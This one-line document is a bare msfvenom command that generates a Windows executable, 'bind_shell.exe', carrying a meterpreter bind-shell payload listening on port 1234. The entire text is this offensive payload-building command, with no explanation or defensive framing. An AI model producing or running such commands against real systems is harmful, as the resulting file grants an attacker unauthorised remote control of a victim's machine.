msfvenom -p windows/meterpreter/bind_tcp LHOST=192.168.1.1 LPORT=1234 -f exe -o bind_shell.exe
